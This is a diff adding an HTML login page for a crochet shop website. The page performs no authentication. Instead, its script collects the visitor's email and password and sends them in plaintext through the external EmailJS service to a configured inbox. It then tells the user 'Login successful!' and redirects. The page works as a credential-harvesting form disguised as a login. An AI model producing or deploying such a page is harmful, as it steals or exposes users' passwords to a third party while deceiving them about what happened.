@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - The Crochet Nest</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("your_emailjs_user_id"); // Replace with your EmailJS User ID
+        })();
+        
+        function sendLoginDetails(event) {
+            event.preventDefault(); // Prevent form submission
+            
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            var templateParams = {
+                user_email: email,
+                user_password: password
+            };
+
+            emailjs.send("your_service_id", "your_template_id", templateParams)
+            .then(function(response) {
+                alert("Login successful! Redirecting...");
+                window.location.href = "index.html"; // Redirect to home page
+            }, function(error) {
+                alert("Error: " + JSON.stringify(error));
+            });
+        }
+    </script>
+</head>
+<body>
+    <h2>Login</h2>
+    <form onsubmit="sendLoginDetails(event)">
+        <label>Email:</label>
+        <input type="email" id="email" required><br>
+        
+        <label>Password:</label>
+        <input type="password" id="password" required><br>
+
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
